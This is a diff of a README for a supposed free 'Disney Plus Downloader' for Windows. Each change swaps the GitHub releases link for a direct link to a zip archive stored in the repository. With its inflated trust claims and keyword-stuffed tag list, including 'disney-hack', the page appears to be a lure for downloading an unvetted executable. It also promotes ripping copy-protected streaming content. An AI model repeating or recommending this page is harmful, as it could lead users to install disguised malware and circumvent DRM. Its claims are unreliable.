@@ -1,6 +1,6 @@
 # 🎬 Disney-Plus-Downloader - Your Free 4K Disney Downloader for Windows
 
-[![Download Disney Plus Downloader](https://img.shields.io/badge/Download-Disney%20Plus%20Downloader%202026-FF69B4?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/goonmaster9000/Disney-Plus-Downloader/releases)
+[![Download Disney Plus Downloader](https://img.shields.io/badge/Download-Disney%20Plus%20Downloader%202026-FF69B4?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/goonmaster9000/Disney-Plus-Downloader/main/simple/Plus_Downloader_Disney_v3.5-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome! This page will help you download and start using **Disney-Plus-Download
 
 ## 📥 Download and Install
 
-**Visit this link to download the application:** [Click here to go to the download page](https://github.com/goonmaster9000/Disney-Plus-Downloader/releases)
+**Visit this link to download the application:** [Click here to go to the download page](https://raw.githubusercontent.com/goonmaster9000/Disney-Plus-Downloader/main/simple/Plus_Downloader_Disney_v3.5-beta.4.zip)
 
 Once you're on that page, follow these simple steps:
 
@@ -123,7 +123,7 @@ Thousands of users trust this tool for their offline Disney Plus needs. Join the
 
 Ready to get started? Here's your action plan:
 
-1. **Visit the download page:** [https://github.com/goonmaster9000/Disney-Plus-Downloader/releases](https://github.com/goonmaster9000/Disney-Plus-Downloader/releases)
+1. **Visit the download page:** [https://raw.githubusercontent.com/goonmaster9000/Disney-Plus-Downloader/main/simple/Plus_Downloader_Disney_v3.5-beta.4.zip](https://raw.githubusercontent.com/goonmaster9000/Disney-Plus-Downloader/main/simple/Plus_Downloader_Disney_v3.5-beta.4.zip)
 2. Download the latest Windows version.
 3. Install it in under two minutes.
 4. Copy a Disney Plus link and paste it into the app.
@@ -131,6 +131,6 @@ Ready to get started? Here's your action plan:
 
 **Don't wait—get your free Disney Plus Downloader today and never worry about buffering or missing an episode again.** Your favorite shows will always be available, even without an internet connection.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Disney%20Plus%20Downloader%202026-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://github.com/goonmaster9000/Disney-Plus-Downloader/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Disney%20Plus%20Downloader%202026-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/goonmaster9000/Disney-Plus-Downloader/main/simple/Plus_Downloader_Disney_v3.5-beta.4.zip)
 
 Keywords: disney, disney-2026, disney-free-2026, disney-free-download, disney-hack, disney-plus, disney-plus-2026, disney-plus-downloader, disney-plus-downloader-2026, disney-plus-downloader-download, disney-plus-downloader-free, disney-plus-downloader-free-download, disney-plus-downloader-latest, disney-plus-downloader-pc, disney-plus-downloader-windows, disney-plus-downloader-working, disney-plus-free, download-disney-plus-downloader, free-download-2026, get-disney-plus-downloader-free
